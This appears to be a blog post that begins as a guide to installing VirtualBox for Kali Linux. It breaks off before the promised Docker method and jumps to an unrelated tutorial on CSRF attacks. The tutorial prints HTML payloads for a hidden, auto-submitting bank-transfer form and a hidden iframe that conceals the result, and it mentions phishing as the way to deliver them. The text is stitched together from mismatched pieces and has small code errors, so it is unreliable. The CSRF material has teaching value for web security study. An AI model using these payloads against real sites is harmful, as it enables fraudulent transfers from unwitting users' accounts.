---
layout: post
title: "Project Kali Install"
subtitle: "Virtualization and Kali Linux"
background: '/img/posts/Kali.jpg'
---

## Background

In the realm of cybersecurity, virtualization plays a crucial role by enabling the creation of isolated virtual environments within a single physical computer. This technology allows for the development of distinct virtual machines, each equipped with its own virtual Central Processing Unit (CPU), Graphics Processing Unit (GPU), Random Access Memory (RAM), Network Interface Card (NIC), storage (HDD, SSD), and input peripherals such as a mouse and keyboard.

The significance of virtualization in cybersecurity lies in its ability to conduct various tasks within these isolated virtual machines, all without compromising the security of the underlying physical machine's operating system. To achieve this, a hypervisor, a specialized software component, must be installed within the host machine's operating system. The hypervisor facilitates hardware virtualization services, ensuring the secure and efficient operation of the virtual environments.

## Setting up your Virtual Environment


![IMDb page](/img/posts/VirtualEnvironment.jpg)


We have outlined instructions for two widely used virtual environments: *VirtualBox* and *Docker*. To initiate the process, opt for either Method #1, which involves configuring VirtualBox and Kali, or Method #2, centered around Docker and Kali.

## Method 1: VirtualBox

#### 1. Download VirtualBox

- Go to **[VirtualBox.org](https://www.virtualbox.org/)**
- Click the big blue button that says "Download VirtualBox".
- Click on the platform package for your operating system.
- Save the file.

#### 2. Install VirtualBox

- Run the installer once the download is finished.
- Select Next to start the installation.
- Select Next to install the default feature set (everything).
- Select Next to choose the default options.
- Select Yes to install the virtual network interfaces. This will allow VirtualBox to create virtual networks and tap into your physical NIC in order for the guest machines to connect to the Internet.
- Select Install.
- Answer `Yes` to the Windows UAC prompt (check for flashing icon in your taskbar)
- Select Finish.

## Exploiting Security: CSRF POST Request Attack

``GET`` requests aren't the sole method for initiating a CSRF attack. An alternative approach involves an attacker fabricating a form. Breaking down the process step by step can provide clarity on the construction of such an attack.

Consider a scenario where an attacker conducts research to understand the appearance of a genuine bank.

```java
<html>
  <head>
    <title>Bank Website</title>
  </head>
  <body>
    <form action="http://bank.com/transfer" method="POST" name="bank_form">
      <input type="text" name="amount" value="" />
      <input type="text" name="to_account" value="" />
      <input type="submit" value="submit" />
    </form>
  </body>
</html>>
```
The attacker can embed that HTML into a different page and deceive a user into submitting the form. This method can bypass any "allow POST requests only" safeguards that may be implemented, as it involves a ``POST`` request. Similar to a ``GET`` request, this ``POST`` request transmits any authorization cookies.

To accomplish this, the attacker simply needs to discover a means of tricking a user into submitting the concealed form. This can be achieved by employing CSS to hide the form and then utilizing JavaScript to automatically submit the form upon page loading.
    
```java
<html>
  <head>
    <title>Fake Form</title>
  </head>
  <body onload="document.bank_form.submit()">
    <form action="http://bank.com/transfer" method="POST" name="bank_form" style="display: none;">
      <input type="text" name="amount" value="10000" />
      <input type="text" name="to_account" value="2468013579" />
    </form>
  </body>
</html>
```

Take note that the body incorporates an ``onload`` attribute, prompting an immediate form submission, while the form employs a ``style`` attribute to keep itself hidden.

This process doesn't necessitate the user to click "Submit"; in fact, there isn't even a submit button on the form. Persuading a user to visit this page is adequate to trigger the request, and accomplishing this can be as simple as embedding a deceptive link in a phishing email.

However, there is a potential issue with this attack. After the form submission, the user might witness the outcomes, like a page on the bank's website confirming a "Funds transfer complete." If a user observes this, they may grow suspicious and likely contact their bank to annul the transaction.

To counter this, an attacker must conceal the results. Forms facilitate the transmission of their outcomes to an ``iframe`` by utilizing a ``target`` attribute.

```java
<html>
  <head>
    <title>Fake Form</title>
  </head>
  <body onload="document.bank_form.submit()">
    <form action="http://bank.com/transfer" method="POST" name="bank_form" style="display: none;" target="hidden_results" >
      <input type="text" name="amount" value="10000" />
      <input type="text" name="to_account" value="2468013579" />
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
```

Observe the inclusion of the ``iframe`` tag, set to "``display: none``," and the addition of a new ``target`` attribute to the ``form`` tag.

By concealing an ``iframe`` and directing the form results to it, the user will remain unaware that a CSRF attack has transpired.